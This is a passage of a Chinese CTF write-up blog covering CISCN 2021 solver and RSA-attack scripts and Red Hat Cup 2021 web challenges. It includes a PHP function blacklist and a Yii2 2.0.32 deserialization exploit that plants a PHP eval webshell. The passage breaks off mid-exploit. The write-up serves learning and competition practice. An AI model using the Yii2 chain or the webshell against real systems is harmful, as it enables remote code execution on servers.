punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num3<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i4 <span class="token operator">!=</span> <span class="token number">3</span> <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4<span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i2 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i2 <span class="token operator">>=</span> i1<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i3 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i3 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i3 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i3 <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">for</span> i4 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i4 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i4 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i3 <span class="token operator">&lt;=</span> i4 <span class="token keyword">or</span> i4 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">continue</span>                        <span class="token keyword">else</span><span class="token punctuation">:</span>                            <span class="token keyword">for</span> i5 <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i5 <span class="token operator">==</span> i1 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i2 <span class="token keyword">or</span> i5 <span class="token operator">==</span> i3 <span class="token keyword">or</span> i5 <span class="token operator">==</span>i4 <span class="token keyword">or</span> i5 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    <span class="token keyword">continue</span>                                <span class="token keyword">else</span><span class="token punctuation">:</span>                                    index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                    index<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                    num5<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token comment">#################################</span><span class="token keyword">for</span> i1 <span class="token keyword">in</span> num1<span class="token punctuation">:</span>    <span class="token keyword">for</span> i2 <span class="token keyword">in</span> num2<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> i2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">1</span>                                              <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i3 <span class="token keyword">in</span> num3<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">0</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i4 <span class="token keyword">in</span> num4<span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">0</span>                            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    flag <span class="token operator">=</span> <span class="token number">1</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> num5<span class="token punctuation">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                        <span class="token keyword">continue</span>                                    <span class="token keyword">else</span><span class="token punctuation">:</span>                                        flag <span class="token operator">=</span> <span class="token number">0</span>                                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span>i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                flag <span class="token operator">=</span> <span class="token number">1</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">continue</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span><span class="token comment">#################################</span></code></pre><p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p><p>fill_number 会检查</p><pre class="language-none"><code class="language-none">map0000000000044000003000010</code></pre><p>最后 md5(1425353142350212150442315,32) &#x3D; 8a04b4597ad08b83211d3adfa1f61431</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> libnum <span class="token keyword">import</span> xgcd<span class="token punctuation">,</span> invmod<span class="token comment">#低解密指数攻击</span>n1<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>e1<span class="token operator">=</span><span class="token number">3</span>c1<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment">#共模攻击</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><span class="token punctuation">,</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><span class="token punctuation">]</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">' [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'&#123;:x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span><span class="token comment">#已知高位p攻击</span><span class="token triple-quoted-string string">"""已知高位p，利用网上的sage脚本，获取pn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902pbits = 512kbits = pbits-p.nbits()p=p&lt;&lt;kbitsprint("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))PR.&lt;x> = PolynomialRing(Zmod(n))f = x + px0 = f.small_roots(X=2^kbits, beta=0.4)[0]print(p+x0)out:upper 312 bits (of 512 bits) is given11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423"""</span>c4 <span class="token operator">=</span> <span class="token number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span>e4 <span class="token operator">=</span> <span class="token number">65537</span>N4 <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>p <span class="token operator">=</span> <span class="token number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span>q <span class="token operator">=</span> N4 <span class="token operator">//</span> pn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e4<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到的16进制转md5即为flag值：</p><img src="/article/ciscn2021/image-20210517144130169.png" class="" title="image-20210517144130169" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红帽杯2021</title>
      <link href="article/redhat2021/"/>
      <url>article/redhat2021/</url>
      
        <content type="html"><![CDATA[<p>Web体验还行，不是太难，压轴题很合理</p><span id="more"></span><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>题目没啥意思23333，还老是503</p><p>扫下目录，访问<code>robots.txt</code> ，得到<code>1ndexx.php</code>，访问页面500报错，应该是缺参数，既然这样那肯定要给源码(不然寄刀片伺候)</p><p>发现备份文件<code>.1ndexx.php.swp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hack.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，先看看phpinfo</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>访问<code>hack.php</code></p><p>搜索字符串，结果发现flag写在了环境变量里，被phpinfo暴露出来了</p><img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy"><p>说实话，<code>1ndexx.php</code>和<code>index.php</code> 切换迷惑人，然后平台的问题，盲猜docker分发写环境变量，最后没删23333</p><hr><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>扫到<code>www.zip</code>，看下是<a href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p><p>去官网下原版比对一下，发现就改了个参数</p><h4 id="Yii2反序列化漏洞"><a href="#Yii2反序列化漏洞" class="headerlink" title="Yii2反序列化漏洞"></a><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2反序列化漏洞</a></h4><p>拿poc直接打，由于base64后可能会有<code>/</code>或者<code>+</code>等，所以先base64一下写函数解码即可</p><p>system似乎被ban了不行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里需要改为isRunning</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string 